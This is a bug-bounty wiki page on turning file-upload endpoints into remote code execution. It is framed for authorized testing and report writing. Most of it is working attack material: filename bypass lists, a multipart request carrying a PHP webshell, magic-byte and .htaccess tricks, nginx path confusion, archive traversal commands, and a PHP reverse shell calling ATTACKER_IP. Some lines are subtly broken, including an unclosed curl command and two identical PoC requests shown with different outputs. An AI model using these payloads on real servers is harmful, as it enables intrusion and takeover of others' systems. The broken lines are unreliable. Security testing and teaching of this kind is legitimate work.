# File Upload to RCE

> tags: chains, web, rce, critical

> related: Attack-Surface/Web/File-Upload, Chains/SSRF-to-Cloud-RCE, Attack-Surface/Web/RCE

File Upload to RCE
Why This Chain Works
Every file upload endpoint is a potential code execution surface. The check between upload and execution is almost always weaker than the developer assumes. Extension blocklists miss double extensions. MIME type checks read a header you control. Magic byte checks pass because you prepend GIF89a to your shell. The server-side stack that processes or serves files often has a quirk - PHP-FPM behind nginx, a .htaccess override, a zip extraction into a web-accessible path - that turns "you can upload a .php file" into "you have a shell."
Related: File Upload Vulnerabilities, SSRF to Cloud RCE, Remote Code Execution

Attack Flow
flowchart TD
    A["Find file upload endpoint"]
    B{"What does the server check?"}
    C["Extension blacklist only"]
    D["MIME type check"]
    E["Magic byte check"]
    F["Double extension / .htaccess"]
    G["Bypass check with chosen technique"]
    H["File stored in web-accessible path"]
    I{"Execution path?"}
    J["PHP-FPM or mod_php<br/>served via web root"]
    K[".htaccess overwrite<br/>in upload directory"]
    L["Archive extraction<br/>path traversal"]
    M["Nginx path confusion<br/>misconfigured location block"]
    N["Request the uploaded file<br/>via browser or curl"]
    O["Shell executes - RCE confirmed"]

    A --> B
    B --> C --> F --> G
    B --> D --> G
    B --> E --> G
    G --> H --> I
    I --> J --> N
    I --> K --> N
    I --> L --> N
    I --> M --> N
    N --> O

    style A fill:#cc3333,color:#fff
    style O fill:#cc3333,color:#fff


Step-by-Step
1. Identify the Upload Surface
Look beyond the obvious avatar/profile picture upload. Document upload portals, CSV importers, backup restore functions, image resizers, and any endpoint accepting a file parameter are all candidates. Find where the file ends up:

Is the uploaded file URL-accessible? (/uploads/filename.ext)
Does the app use a CDN with path-based routing that passes through a PHP handler?
Does the app extract archives (zip, tar) on the server?

2. Extension Blacklist Bypass
If the server blocks .php by name, try:
shell.php5
shell.phtml
shell.pHp
shell.php.jpg        (double extension - older servers execute leftmost)
shell.php%00.jpg     (null byte - rare but still seen in legacy apps)
shell.php7
shell.phar
Upload each variant. Then request it. If any returns PHP output rather than a download, you have execution.
3. MIME Type Check Bypass
The Content-Type header is attacker-controlled. The server reads what you send:
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary
 
------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
 
<?php system($_GET['cmd']); ?>
------boundary--
Set Content-Type: image/jpeg while uploading .php content. Most MIME checks only read the Content-Type header, not the file content.
4. Magic Byte Confusion
Some servers read the first few bytes of the file to determine type. Prepend a valid image header:
GIF89a
<?php system($_GET['cmd']); ?>
Save as shell.php. The magic bytes satisfy the check; the PHP interpreter skips the GIF header and executes the <?php block.
For JPEG:
python3 -c "
with open('shell.php', 'wb') as f:
    f.write(b'\xff\xd8\xff\xe0')  # JPEG magic bytes
    f.write(b'\n<?php system(\$_GET[\"cmd\"]); ?>')
"
5. .htaccess Overwrite
If the upload directory is on Apache and you can upload arbitrary files (not just specific extensions), upload a .htaccess file to the same directory:
AddType application/x-httpd-php .jpg
Now every .jpg in that directory is executed as PHP. Upload shell.jpg containing your webshell. Request it.
Alternatively:
Options +ExecCGI
AddHandler cgi-script .txt
6. Nginx + PHP-FPM Path Confusion
On nginx configurations that pass requests to PHP-FPM with a PATH_INFO variable:
Uploaded file: /uploads/shell.jpg
Request URL:   /uploads/shell.jpg/nonexistent.php
If nginx is configured with fastcgi_split_path_info ^(.+\.php)(/.+)$; without try_files protecting the file existence check, PHP-FPM executes shell.jpg because the request ends in .php.
7. Zip Extraction Path Traversal
If the application accepts zip archives and extracts them server-side:
# Create malicious zip
mkdir -p evil/../../uploads
cp shell.php evil/../../uploads/shell.php
zip -r malicious.zip evil/
Depending on the extraction library and path sanitisation, this may land shell.php outside the intended extraction directory.
A simpler symlink approach for tar:
ln -s /var/www/html/webroot symlink
tar czf malicious.tar.gz symlink/
8. The Shell
Once you have execution, confirm with:
curl "target.com/uploads/shell.php
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
For a proper reverse shell:
<?php
$sock=fsockopen("ATTACKER_IP",4444);
$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>

PoC Template for Report
1. Navigate to /account/avatar (file upload endpoint)
2. Upload file: shell.php containing <?php system($_GET['cmd']); ?>
   Content-Type header set to image/jpeg
   Server responds 200: {"url":"/uploads/abc123/shell.php"}
3. Request: GET /uploads/abc123/shell.php
   Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
4. Request: GET /uploads/abc123/shell.php
   Response: prod-web-01
5. Shell confirmed. File deleted immediately after PoC.
   Screenshot of id and hostname output attached.
Always delete the uploaded shell immediately after the PoC screenshot. Include that deletion in the report.

Public Reports

File upload to RCE on HackerOne via ImageMagick processing - HackerOne #350705
PHP webshell upload bypass via Content-Type manipulation on Shopify - HackerOne #1120307
RCE via file upload and path traversal in archive extraction on GitLab - HackerOne #1667751
Unrestricted file upload to RCE via .htaccess on Valve - HackerOne #1154542


Reporting Notes
Show the upload request, the server's response confirming the file location, and the execution request with output. Delete the shell immediately and say so in the report. Triagers take upload-to-RCE seriously when you show the id command output with a real server hostname. Note which bypass technique worked and why the check failed - this gives the team a clear fix. If execution requires a specific file path to be web-accessible, include that architectural note: it helps triage understand scope.